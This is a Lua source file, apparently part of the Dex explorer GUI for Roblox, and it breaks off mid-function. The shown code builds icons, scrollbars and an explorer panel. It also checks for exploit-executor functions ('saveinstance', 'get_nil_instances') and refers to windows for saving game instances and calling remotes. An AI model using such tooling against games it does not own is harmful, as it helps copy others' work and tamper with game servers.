local ACTION_SORT        	 = 164
local ACTION_CUT_OVER    	 = 174
local ACTION_COPY_OVER   	 = 175
local ACTION_PASTE_OVER  	 = 176
local ACTION_DELETE_OVER	 = 177
local ACTION_SORT_OVER  	 = 178
local ACTION_EDITQUICKACCESS = 190
local ACTION_FREEZE 		 = 188
local ACTION_STARRED 		 = 189
local ACTION_ADDSTAR 		 = 184
local ACTION_ADDSTAR_OVER 	 = 187

local NODE_COLLAPSED      = 165
local NODE_EXPANDED       = 166
local NODE_COLLAPSED_OVER = 179
local NODE_EXPANDED_OVER  = 180

local ExplorerIndex = {
	["Accessory"] = 32;
	["Accoutrement"] = 32;
	["AdService"] = 73;
	["Animation"] = 60;
	["AnimationController"] = 60;
	["AnimationTrack"] = 60;
	["Animator"] = 60;
	["ArcHandles"] = 56;
	["AssetService"] = 72;
	["Attachment"] = 34;
	["Backpack"] = 20;
	["BadgeService"] = 75;
	["BallSocketConstraint"] = 89;
	["BillboardGui"] = 64;
	["BinaryStringValue"] = 4;
	["BindableEvent"] = 67;
	["BindableFunction"] = 66;
	["BlockMesh"] = 8;
	["BloomEffect"] = 90;
	["BlurEffect"] = 90;
	["BodyAngularVelocity"] = 14;
	["BodyForce"] = 14;
	["BodyGyro"] = 14;
	["BodyPosition"] = 14;
	["BodyThrust"] = 14;
	["BodyVelocity"] = 14;
	["BoolValue"] = 4;
	["BoxHandleAdornment"] = 54;
	["BrickColorValue"] = 4;
	["Camera"] = 5;
	["CFrameValue"] = 4;
	["CharacterMesh"] = 60;
	["Chat"] = 33;
	["ClickDetector"] = 41;
	["CollectionService"] = 30;
	["Color3Value"] = 4;
	["ColorCorrectionEffect"] = 90;
	["ConeHandleAdornment"] = 54;
	["Configuration"] = 58;
	["ContentProvider"] = 72;
	["ContextActionService"] = 41;
	["CoreGui"] = 46;
	["CoreScript"] = 18;
	["CornerWedgePart"] = 1;
	["CustomEvent"] = 4;
	["CustomEventReceiver"] = 4;
	["CylinderHandleAdornment"] = 54;
	["CylinderMesh"] = 8;
	["CylindricalConstraint"] = 89;
	["Debris"] = 30;
	["Decal"] = 7;
	["Dialog"] = 62;
	["DialogChoice"] = 63;
	["DoubleConstrainedValue"] = 4;
	["Explosion"] = 36;
	["FileMesh"] = 8;
	["Fire"] = 61;
	["Flag"] = 38;
	["FlagStand"] = 39;
	["FloorWire"] = 4;
	["Folder"] = 70;
	["ForceField"] = 37;
	["Frame"] = 48;
	["GamePassService"] = 19;
	["Glue"] = 34;
	["GuiButton"] = 52;
	["GuiMain"] = 47;
	["GuiService"] = 47;
	["Handles"] = 53;
	["HapticService"] = 84;
	["Hat"] = 45;
	["HingeConstraint"] = 89;
	["Hint"] = 33;
	["HopperBin"] = 22;
	["HttpService"] = 76;
	["Humanoid"] = 9;
	["ImageButton"] = 52;
	["ImageLabel"] = 49;
	["InsertService"] = 72;
	["IntConstrainedValue"] = 4;
	["IntValue"] = 4;
	["JointInstance"] = 34;
	["JointsService"] = 34;
	["Keyframe"] = 60;
	["KeyframeSequence"] = 60;
	["KeyframeSequenceProvider"] = 60;
	["Lighting"] = 13;
	["LineHandleAdornment"] = 54;
	["LocalScript"] = 18;
	["LogService"] = 87;
	["MarketplaceService"] = 46;
	["Message"] = 33;
	["Model"] = 2;
	["ModuleScript"] = 71;
	["Motor"] = 34;
	["Motor6D"] = 34;
	["MoveToConstraint"] = 89;
	["NegateOperation"] = 78;
	["NetworkClient"] = 16;
	["NetworkReplicator"] = 29;
	["NetworkServer"] = 15;
	["NumberValue"] = 4;
	["ObjectValue"] = 4;
	["Pants"] = 44;
	["ParallelRampPart"] = 1;
	["Part"] = 1;
	["ParticleEmitter"] = 69;
	["PartPairLasso"] = 57;
	["PathfindingService"] = 37;
	["Platform"] = 35;
	["Player"] = 12;
	["PlayerGui"] = 46;
	["Players"] = 21;
	["PlayerScripts"] = 82;
	["PointLight"] = 13;
	["PointsService"] = 83;
	["Pose"] = 60;
	["PrismaticConstraint"] = 89;
	["PrismPart"] = 1;
	["PyramidPart"] = 1;
	["RayValue"] = 4;
	["ReflectionMetadata"] = 86;
	["ReflectionMetadataCallbacks"] = 86;
	["ReflectionMetadataClass"] = 86;
	["ReflectionMetadataClasses"] = 86;
	["ReflectionMetadataEnum"] = 86;
	["ReflectionMetadataEnumItem"] = 86;
	["ReflectionMetadataEnums"] = 86;
	["ReflectionMetadataEvents"] = 86;
	["ReflectionMetadataFunctions"] = 86;
	["ReflectionMetadataMember"] = 86;
	["ReflectionMetadataProperties"] = 86;
	["ReflectionMetadataYieldFunctions"] = 86;
	["RemoteEvent"] = 80;
	["RemoteFunction"] = 79;
	["ReplicatedFirst"] = 72;
	["ReplicatedStorage"] = 72;
	["RightAngleRampPart"] = 1;
	["RocketPropulsion"] = 14;
	["RodConstraint"] = 89;
	["RopeConstraint"] = 89;
	["Rotate"] = 34;
	["RotateP"] = 34;
	["RotateV"] = 34;
	["RunService"] = 66;
	["ScreenGui"] = 47;
	["Script"] = 6;
	["ScrollingFrame"] = 48;
	["Seat"] = 35;
	["Selection"] = 55;
	["SelectionBox"] = 54;
	["SelectionPartLasso"] = 57;
	["SelectionPointLasso"] = 57;
	["SelectionSphere"] = 54;
	["ServerScriptService"] = 0;
	["ServerStorage"] = 74;
	["Shirt"] = 43;
	["ShirtGraphic"] = 40;
	["SkateboardPlatform"] = 35;
	["Sky"] = 28;
	["SlidingBallConstraint"] = 89;
	["Smoke"] = 59;
	["Snap"] = 34;
	["Sound"] = 11;
	["SoundService"] = 31;
	["Sparkles"] = 42;
	["SpawnLocation"] = 25;
	["SpecialMesh"] = 8;
	["SphereHandleAdornment"] = 54;
	["SpotLight"] = 13;
	["SpringConstraint"] = 89;
	["StarterCharacterScripts"] = 82;
	["StarterGear"] = 20;
	["StarterGui"] = 46;
	["StarterPack"] = 20;
	["StarterPlayer"] = 88;
	["StarterPlayerScripts"] = 82;
	["Status"] = 2;
	["StringValue"] = 4;
	["SunRaysEffect"] = 90;
	["SurfaceGui"] = 64;
	["SurfaceLight"] = 13;
	["SurfaceSelection"] = 55;
	["Team"] = 24;
	["Teams"] = 23;
	["TeleportService"] = 81;
	["Terrain"] = 65;
	["TerrainRegion"] = 65;
	["TestService"] = 68;
	["TextBox"] = 51;
	["TextButton"] = 51;
	["TextLabel"] = 50;
	["Texture"] = 10;
	["TextureTrail"] = 4;
	["Tool"] = 17;
	["TouchTransmitter"] = 37;
	["TrussPart"] = 1;
	["UnionOperation"] = 77;
	["UserInputService"] = 84;
	["Vector3Value"] = 4;
	["VehicleSeat"] = 35;
	["VelocityMotor"] = 34;
	["WedgePart"] = 1;
	["Weld"] = 34;
	["Workspace"] = 19;
}

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end

local barActive = false
local activeOptions = {}

function createDDown(dBut, callback,...)
	if barActive then
		for i,v in pairs(activeOptions) do
			v:Destroy()
		end
		activeOptions = {}
		barActive = false
		return
	else
		barActive = true
	end
	local slots = {...}
	local base = dBut
	for i,v in pairs(slots) do
		local newOption = base:Clone()
		newOption.ZIndex = 5
		newOption.Name = "Option "..tostring(i)
		newOption.Parent = base.Parent.Parent.Parent
		newOption.BackgroundTransparency = 0
		newOption.ZIndex = 2
		table.insert(activeOptions,newOption)
		newOption.Position = UDim2.new(-0.4, dBut.Position.X.Offset, dBut.Position.Y.Scale, dBut.Position.Y.Offset + (#activeOptions * dBut.Size.Y.Offset))
		newOption.Text = slots[i]
		newOption.MouseButton1Down:connect(function()
			dBut.Text = slots[i]
			callback(slots[i])
			for i,v in pairs(activeOptions) do
				v:Destroy()
			end
			activeOptions = {}
			barActive = false
		end)
	end
end

-- Connects a function to an event such that it fires asynchronously
function Connect(event,func)
	return event:connect(function(...)
		local a = {...}
		spawn(function() func(unpack(a)) end)
	end)
end

-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end

do
	local ZIndexLock = {}
	-- Sets the ZIndex of an object and its descendants. Objects are locked so
	-- that SetZIndexOnChanged doesn't spawn multiple threads that set the
	-- ZIndex of the same object.
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end

	function SetZIndexOnChanged(object)
		return object.Changed:connect(function(p)
			if p == "ZIndex" then
				SetZIndex(object,object.ZIndex)
			end
		end)
	end
end

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

		if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
				ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
					BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end

		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- ScrollBar
do
	-- AutoButtonColor doesn't always reset properly
	local function ResetButtonColor(button)
		local active = button.Active
		button.Active = not active
		button.Active = active
	end

	local function ArrowGraphic(size,dir,scaled,template)
		local Frame = Create('Frame',{
			Name = "Arrow Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size,0,size);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		local transform
		if dir == nil or dir == 'Up' then
			function transform(p,s) return p,s end
		elseif dir == 'Down' then
			function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
		elseif dir == 'Left' then
			function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		elseif dir == 'Right' then
			function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		end

		local scale
		if scaled then
			function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
		else
			function scale(p,s) return p,s end
		end

		local o = math.floor(size/4)
		if size%2 == 0 then
			local n = size/2-1
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,(i+1)*2,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		else
			local n = (size-1)/2
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,i*2+1,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		end
		if size%4 > 1 then
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,0,0,size-o-1),
				UDim2.new(0,size,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
		return Frame
	end


	local function GripGraphic(size,dir,spacing,scaled,template)
		local Frame = Create('Frame',{
			Name = "Grip Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size.x,0,size.y);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		spacing = spacing or 2

		local scale
		if scaled then
			function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
		else
			function scale(p) return p end
		end

		if dir == 'Vertical' then
			for i=0,size.x-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,1,0,size.y))
				t.Position = scale(UDim2.new(0,i,0,0))
				t.Parent = Frame
			end
		elseif dir == nil or dir == 'Horizontal' then
			for i=0,size.y-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,size.x,0,1))
				t.Position = scale(UDim2.new(0,0,0,i))
				t.Parent = Frame
			end
		end

		return Frame
	end

	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-GUI_SIZE) or UDim2.new(1,-GUI_SIZE,0,0);
			Size = horizontal and UDim2.new(1,0,0,GUI_SIZE) or UDim2.new(0,GUI_SIZE,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-GUI_SIZE,0,0) or UDim2.new(0,0,1,-GUI_SIZE);
				Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
				BackgroundColor3 = GuiColor.Button;
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
				BackgroundColor3 = GuiColor.Button;
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-GUI_SIZE*2,1,0) or UDim2.new(1,0,1,-GUI_SIZE*2);
				Position = horizontal and UDim2.new(0,GUI_SIZE,0,0) or UDim2.new(0,0,0,GUI_SIZE);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
					BackgroundColor3 = GuiColor.Button;
					BorderColor3 = GuiColor.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = GuiColor.Border;
		})
		local graphicSize = GUI_SIZE/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = GUI_SIZE*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,GUI_SIZE)
				if ScrollThumbFrame.AbsoluteSize.x < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Explorer panel

local explorerPanel = D_E_X.ExplorerPanel
Create(explorerPanel,{
	BackgroundColor3 = GuiColor.Field;
	BorderColor3 = GuiColor.Border;
	Active = true;
})

local SettingsRemote = explorerPanel.Parent:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")
local GetApiRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetApi")
local GetAwaitRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetAwaiting")
local bindSetAwaiting = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("SetAwaiting")

local SaveInstanceWindow = explorerPanel.Parent:WaitForChild("SaveInstance")
local ConfirmationWindow = explorerPanel.Parent:WaitForChild("Confirmation")
local CautionWindow = explorerPanel.Parent:WaitForChild("Caution")
local TableCautionWindow = explorerPanel.Parent:WaitForChild("TableCaution")

local RemoteWindow = explorerPanel.Parent:WaitForChild("CallRemote")

local ScriptEditor = explorerPanel.Parent:WaitForChild("ScriptEditor")
local ScriptEditorEvent = ScriptEditor:WaitForChild("OpenScript")

local CurrentSaveInstanceWindow
local CurrentRemoteWindow

local lastSelectedNode

local DexStorage
local DexStorageMain
local DexStorageEnabled

if saveinstance then DexStorageEnabled = true end

if DexStorageEnabled then
	DexStorage = Instance.new("Folder")
	DexStorage.Name = "Dex"
	DexStorageMain = Instance.new("Folder",DexStorage)
	DexStorageMain.Name = "DexStorage"
end

local NilStorage
local NilStorageMain
local NilStorageEnabled

if get_nil_instances and IfThisFunctionWasStableEnough then NilStorageEnabled = true end

if NilStorageEnabled then
	NilStorage = Instance.new("Folder")
	NilStorage.Name = "Dex Internal Storage"
	NilStorageMain = Instance.new("Folder",NilStorage)
	NilStorageMain.Name = "Nil Instances"
end

local listFrame = Create('Frame',{
	Name = "List";
	BackgroundTransparency = 1;
	ClipsDescendants = true;
	Position = UDim2.new(0,0,0,HEADER_SIZE);
	Size = UDim2.new(1,-GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-GUI_SIZE,0,HEADER_SIZE);
	Size = UDim2.new(0,GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = GUI_SIZE
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-GUI_SIZE);
	Size = UDim2.new(1,-GUI_SIZE,0,GUI_SIZE);
	Visible = false;
	Parent = explorerPanel;
})

local headerFrame = Create('Frame',{
	Name = "Header";
	BackgroundColor3 = GuiColor.Background;
	BorderColor3 = GuiColor.Border;
	Position = UDim2.new(0,0,0,0);
	Size = UDim2.new(1,0,0,HEADER_SIZE);
	Parent = explorerPanel;
	Create('TextLabel',{
		Text = "Explorer";
		BackgroundTransparency = 1;
		TextColor3 = GuiColor.Text;
		TextXAlignment = 'Left';
		Font = FONT;
		FontSize = FONT_SIZE;
		Position = UDim2.new(0,4,0,0);
		Size = UDim2.new(1,-4,0.5,0);
	});
})

local explorerFilter = 	Create('TextBox',{
	Text = "Filter Workspace";
	BackgroundTransparency = 0.8;
	TextColor3 = GuiColor.Text;
	TextXAlignment = 'Left';
	Font = FONT;
	FontSize = FONT_SIZE;
	Position = UDim2.new(0,4,0.5,0);
	Size = UDim2.new(1,-8,0.5,-2);
});
explorerFilter.Parent = headerFrame

SetZIndexOnChanged(explorerPanel)

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(255,255,255);
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(0,0,0);
	TextColorOver = Styles.White;
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 20;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(86,125,188);
	BorderColor = CreateColor3(216,216,216);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160,160,160);
	ArrowColorOver = Styles.Black;
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Styles.Black;
	TextColorOver = Styles.White;
	TextLockedColor = CreateColor3(120,120,120);
	Height = 24;
	BorderColor = CreateColor3(216,216,216);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(246,246,246);
	BackgroundColorMouseover = CreateColor3(211,224,244);
	TitleMarginLeft = 15;
}

local currentRightClickMenu
local CurrentInsertObjectWindow
local CurrentFunctionCallerWindow

local RbxApi

function ClassCanCreate(IName)
